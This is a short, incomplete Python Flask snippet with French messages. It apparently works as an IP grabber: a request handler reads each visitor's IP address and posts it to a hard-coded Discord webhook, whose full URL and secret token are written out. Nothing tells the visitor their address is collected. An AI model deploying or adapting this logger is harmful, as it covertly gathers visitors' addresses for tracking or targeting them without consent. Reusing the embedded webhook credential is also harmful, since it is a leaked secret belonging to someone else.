from flask import Flask, request, render_template
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1189581246829957180/aRFpdCSf9AgfhrzGP0F5cjWxu1lG5-hlejBf3se-7BISIbx4VRS6aD-jiiy4BwpHgqZo'

def index():
    user_ip = request.remote_addr
    send_to_discord_webhook(user_ip)

def send_to_discord_webhook(user_ip):
    payload = {
        'content': f"Adresse IP de l'utilisateur : {user_ip}"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("Adresse IP envoyée avec succès au webhook Discord.")
        else:
            print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord. Code de statut : {response.status_code}")
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord : {str(e)}")

